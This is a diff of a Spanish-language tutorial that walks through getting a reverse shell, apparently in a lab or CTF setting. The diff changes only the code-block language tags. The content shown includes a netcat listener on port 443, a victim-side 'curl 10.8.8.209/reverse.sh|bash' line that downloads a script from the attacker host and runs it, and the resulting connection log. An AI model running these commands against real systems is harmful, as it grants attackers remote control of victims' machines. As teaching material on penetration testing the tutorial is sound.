@@ -4,7 +4,7 @@ ____
 Para crear una conexion reversa, en este caso, utilizaremos bin bash, por lo que se deben seguir los siguientes pasas
 
 #### 1. Script bash 
-```bat
+```java
        │ File: reverse.sh
 ───────┼─────────────────────────────────────────────────────────────────────────────────────────
    1   │ #/bin/bash
@@ -16,20 +16,20 @@ Para crear una conexion reversa, en este caso, utilizaremos bin bash, por lo que
 #### 2. Iniciar servicio netcat
 
 Para ejecutar una shell reversa vamos a crear la comunicación utilizando el servicio de netcat o **_nc_**, para los amigos, y abrir un puerto de comunicación para poner en escucha. 
->```bat
+>```java
 >root$nc -nlvp 443
 >listening on [any] 443 ...
 >```
 #### 3. Ejecutar la comunicación desde el equipo víctima.
 Para hacer la carga del LFI, para este ejercicio supondremos,  que esta petinición se puede hacer desde el equipo victima, y para descar el archivo reverse.sh utilizaremos un servidor web para obtener el LFI.
->```bat
+>```java
 >/usr/bin/curl 10.8.8.209/reverse.sh|bash
 >```
 #### 4. Resultado.
 
 Si el proceso se realizó correctamente, podemos verificar la conexion en el siguiente resultado en la tercera línea.
 
->```bat
+>```java
 >root$nc -nlvp 443
 >listening on [any] 443 ...
 >connect to [10.8.8.209] from (UNKNOWN) [10.10.252.152] 49562  
